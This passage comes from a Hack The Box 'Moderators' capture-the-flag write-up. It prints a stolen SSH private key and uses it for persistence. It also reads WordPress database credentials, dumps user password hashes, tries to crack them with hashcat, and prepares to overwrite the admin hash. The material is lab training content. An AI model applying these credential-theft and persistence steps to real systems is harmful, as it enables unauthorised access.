font-style: inherit;">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb19-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
<span id="cb19-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn</span></span>
<span id="cb19-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM</span></span>
<span id="cb19-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa</span></span>
<span id="cb19-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV</span></span>
<span id="cb19-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dQ5ymZTot+/qALnzlDkeUlT/RWtqJxJc6MlWy5/neegZRRd3YNhln/1GyL5aN/0O1gBwf3</span></span>
<span id="cb19-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vY87IYFXK/W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWv</span></span>
<span id="cb19-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cxbVFo9M2axqTTnr/gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64</span></span>
<span id="cb19-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2</span></span>
<span id="cb19-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22Ym</span></span>
<span id="cb19-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uTIXx4SQy/PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCy</span></span>
<span id="cb19-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">oZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI/AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoT</span></span>
<span id="cb19-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">KxiiVYy9J9lL6n/w8OKLkCt08F3c65boQqPYnG/tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv</span></span>
<span id="cb19-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6gC585Q5HlJU/0VraicSXOjJVsuf53noGUUXd2DYZZ/9Rsi+Wjf9DtYAcH972POyGBVyv1</span></span>
<span id="cb19-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNms</span></span>
<span id="cb19-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ak056/4BZC81NLI/JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0/GihmCpeuLzvmicYkz5D</span></span>
<span id="cb19-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6YCOi/qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9/OojjeW8274QaVURpB</span></span>
<span id="cb19-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C/kFL5nuH10LrnpfM/7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7/cLGvC</span></span>
<span id="cb19-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo/CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g0</span></span>
<span id="cb19-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">07/hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX/yM2V</span></span>
<span id="cb19-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX/EYy</span></span>
<span id="cb19-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">y8HfqtCPWmplcrhtw/DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWp</span></span>
<span id="cb19-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">o1D3Rv/KRIVRog9+7e6r8aRVPf/vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVu</span></span>
<span id="cb19-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">x4G5F1sD9bamasGARP/j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAA</span></span>
<span id="cb19-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe/DYpdFOjIK888U</span></span>
<span id="cb19-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6</span></span>
<span id="cb19-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT/KbXMifJn</span></span>
<span id="cb19-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LrcrmS/t+QdOG2Vf/7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3/xrUZyhlWn</span></span>
<span id="cb19-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM/u9CqWiaU</span></span>
<span id="cb19-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">h7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC/mM40/JNJ9Rqa9Io</span></span>
<span id="cb19-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63</span></span>
<span id="cb19-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">egq/DaGJECdxk9CNDElLVQxBs3X4i/AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm</span></span>
<span id="cb19-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0iAt4qjy/3uoN0NdQrX+8laOMIzRVe/Br4Py4NVmRTsMfU5t/1Jz/DXJoy9CcXD5VKkUnU</span></span>
<span id="cb19-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">p668wxSJC8y/5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF/h4iiUW4mMKyAzvg/iDfjGmb</span></span>
<span id="cb19-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly</span></span>
<span id="cb19-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==</span></span>
<span id="cb19-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> OPENSSH PRIVATE KEY-----</span></code></pre></div>
<p>Double check that <code>lexi</code>’s id_rsa can be used for persistence before closing all reverse connections.</p>
<pre><code>➜  moderators vim lexi-id_rsa 
➜  moderators chmod 400 lexi-id_rsa
➜  moderators ssh lexi@moderators.htb -i lexi-id_rsa
lexi@moderators:~$</code></pre>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>We are now able to read <code>wp-config.php</code>:</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi@moderators:/opt/site.new$</span> cat wp-config.php</span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb21-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/**</span> MySQL database username <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/</span>
<span id="cb21-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DB_USER'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'wordpressuser'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb21-5"></span>
<span id="cb21-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/**</span> MySQL database password <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/</span>
<span id="cb21-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DB_PASSWORD'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'wordpresspassword123!!'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb21-8"></span>
<span id="cb21-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/**</span> MySQL hostname <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/</span>
<span id="cb21-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DB_HOST'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span></code></pre></div>
<p>Look if there are any users in the SQL Database:</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi@moderators:/opt/site.new$</span> mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> wordpressuser <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span></span>
<span id="cb22-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> password: wordpresspassword123!!</span>
<span id="cb22-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Welcome</span> to the MariaDB monitor.  Commands end with <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">or</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\g</span>.</span>
<span id="cb22-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Your</span> MariaDB connection id is 40</span>
<span id="cb22-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Server</span> version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04</span>
<span id="cb22-6"></span>
<span id="cb22-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> [<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">none</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show databases<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb22-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------------------+</span></span>
<span id="cb22-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Database</span>           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------------------+</span></span>
<span id="cb22-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">information_schema</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wordpress</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------------------+</span></span>
<span id="cb22-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span> rows in set <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.001</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb22-15"></span>
<span id="cb22-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> [<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">none</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> use wordpress<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb22-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Reading</span> table information for completion of table and column names</span>
<span id="cb22-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">You</span> can turn off this feature to get a quicker startup with <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-A</span></span>
<span id="cb22-19"></span>
<span id="cb22-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Database</span> changed</span>
<span id="cb22-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">wordpress</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show tables<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb22-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----------------------------+</span></span>
<span id="cb22-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Tables_in_wordpress</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----------------------------+</span></span>
<span id="cb22-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_commentmeta</span>             <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_comments</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_links</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_options</span>                 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_pms_category</span>            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_pms_passwords</span>           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_postmeta</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_posts</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_prflxtrflds_fields_meta</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-34"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_term_relationships</span>      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-35"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_term_taxonomy</span>           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-36"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_termmeta</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-37"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_terms</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_usermeta</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_users</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wp_wpfm_backup</span>             <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----------------------------+</span></span>
<span id="cb22-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">16</span> rows in set <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.000</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb22-43"></span>
<span id="cb22-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">wordpress</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from wp_users<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb22-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+</span></span>
<span id="cb22-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ID</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_login</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_pass</span>                          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_nicename</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_email</span>           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_url</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_registered</span>     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_activation_key</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_status</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">display_name</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+</span></span>
<span id="cb22-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin@moderators.htb</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://192.168.1.4:8080</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2021-09-11</span> 05:30:20 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>                     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>           <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-49"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span>       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$P$BZ0Fj92qgnvg4F52r3lpwHejcXag461</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi@moderators.htb</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>                         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2021-09-12</span> 16:51:16 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>                     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>           <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span>         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb22-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+</span></span></code></pre></div>
<p>We’re unable to crack any of the hashes</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators cat wp.hash                                                      </span>
<span id="cb23-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0</span></span>
<span id="cb23-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$P$BZ0Fj92qgnvg4F52r3lpwHejcXag461</span></span>
<span id="cb23-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m400</span> wp.hash /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span></span></code></pre></div>
<p>Instead we investigate the possibility of changing the password for user <code>admin</code>. From the site <a href="https://www.useotools.com/wordpress-password-hash-generator/output">useotools.com</a> we write wanted password and are returned both the hash and also the SQL Query needed to update the table.</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators10.png" class="img-fluid"></p>
